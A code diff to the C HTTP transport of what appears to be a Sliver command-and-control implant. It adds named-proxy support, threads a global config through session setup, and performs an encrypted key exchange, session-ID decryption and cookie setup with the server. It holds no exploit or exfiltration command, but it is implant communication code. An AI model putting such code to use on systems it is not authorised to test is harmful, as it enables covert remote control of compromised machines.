@@ -258,8 +258,7 @@ static DWORD WinHttpDefaultProxyConstant(VOID)
 PHTTP_SESSION HttpSessionInit
 (
 	_In_ PURI pUri,
-	_In_ LPWSTR lpProxy,
-	_In_ LPWSTR lpProxyBypass
+	_In_ LPWSTR lpProxy
 )
 {
 	PHTTP_SESSION Result = NULL;
@@ -270,7 +269,7 @@ PHTTP_SESSION HttpSessionInit
 		Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 	else {
-
+		Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NAMED_PROXY, lpProxy, L"<local>", 0);
 	}
 
 	if (!Result->hSession) {
@@ -294,8 +293,7 @@ CLEANUP:
 PHTTP_CLIENT HttpClientInit
 (
 	_In_ PURI pUri,
-	_In_ LPWSTR lpProxy,
-	_In_ LPWSTR lpProxyBypass
+	_In_ LPWSTR lpProxy
 )
 {
 	PHTTP_CLIENT Result = NULL;
@@ -304,7 +302,7 @@ PHTTP_CLIENT HttpClientInit
 	lpHostName = ConvertCharToWchar(pUri->lpHostName);
 	Result = ALLOC(sizeof(HTTP_CLIENT));
 	Result->pUri = pUri;
-	Result->pHttpSession = HttpSessionInit(pUri, lpProxy, lpProxyBypass);
+	Result->pHttpSession = HttpSessionInit(pUri, lpProxy);
 	if (Result->pHttpSession == NULL) {
 		FreeHttpClient(Result);
 		Result = NULL;
@@ -684,6 +682,7 @@ CLEANUP:
 
 PSLIVER_HTTP_CLIENT HttpInit
 (
+	_In_ PGLOBAL_CONFIG pGlobalConfig,
 	_In_ PHTTP_PROFILE pProfile
 )
 {
@@ -697,6 +696,7 @@ PSLIVER_HTTP_CLIENT HttpInit
 	pResult->OtpData.dwInterval = 30;
 	pResult->OtpData.dwDigits = 8;
 	pResult->pProfile = pProfile;
+	pResult->pGlobalConfig = pGlobalConfig;
 
 	return pResult;
 }
@@ -861,7 +861,6 @@ BOOL HttpCleanup
 
 BOOL HttpStart
 (
-	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PSLIVER_HTTP_CLIENT pHttpClient
 )
 {
@@ -881,9 +880,11 @@ BOOL HttpStart
 	WCHAR wszSetCookie[0x100];
 	LPWSTR lpTemp = NULL;
 	LPSTR lpCookiePrefix = NULL;
+	PGLOBAL_CONFIG pGlobalConfig = NULL;
 
 	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
-	lpFullUri = StartSessionURL(pConfig, pHttpClient);
+	pGlobalConfig = pHttpClient->pGlobalConfig;
+	lpFullUri = StartSessionURL(pGlobalConfig, pHttpClient);
 	if (lpFullUri == NULL) {
 		goto CLEANUP;
 	}
@@ -893,13 +894,13 @@ BOOL HttpStart
 		goto CLEANUP;
 	}
 
-	pHttpClient->pHttpClient = HttpClientInit(pUri);
+	pHttpClient->pHttpClient = HttpClientInit(pUri, pGlobalConfig->lpProxy);
 	if (pHttpClient->pHttpClient == NULL) {
 		goto CLEANUP;
 	}
 
-	pMarshaledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
-	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
+	pMarshaledData = CreateBytesElement(pGlobalConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
+	pEncryptedSessionInit = AgeKeyExToServer(pGlobalConfig->lpRecipientPubKey, pGlobalConfig->lpPeerPrivKey, pGlobalConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
 	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
 		goto CLEANUP;
 	}
@@ -911,9 +912,9 @@ BOOL HttpStart
 	}
 
 	pDecodedResp = Base64Decode(pResp->pRespData);
-	pSessionId = SliverDecrypt(pConfig->pSessionKey, pDecodedResp);
-	memcpy(pConfig->szSessionID, pSessionId->pBuffer, 0x20);
-	pConfig->szSessionID[0x20] = '\0';
+	pSessionId = SliverDecrypt(pGlobalConfig->pSessionKey, pDecodedResp);
+	memcpy(pGlobalConfig->szSessionID, pSessionId->pBuffer, 0x20);
+	pGlobalConfig->szSessionID[0x20] = '\0';
 	dwSetCookieLength = sizeof(wszSetCookie);
 	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
 		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
@@ -923,8 +924,8 @@ BOOL HttpStart
 	lpTemp = StrChrW(wszSetCookie, L'=');
 	lpTemp[0] = L'\0';
 	lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
-	pHttpClient->pHttpConfig->AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pConfig->szSessionID) + lstrlenA(lpCookiePrefix) + 2);
-	wsprintfA(pHttpClient->pHttpConfig->AdditionalHeaders[Cookie], "%s=%s", lpCookiePrefix, pConfig->szSessionID);
+	pHttpClient->pHttpConfig->AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pGlobalConfig->szSessionID) + lstrlenA(lpCookiePrefix) + 2);
+	wsprintfA(pHttpClient->pHttpConfig->AdditionalHeaders[Cookie], "%s=%s", lpCookiePrefix, pGlobalConfig->szSessionID);
 	Result = TRUE;
 CLEANUP:
 	FREE(lpEncodedSessionKey);
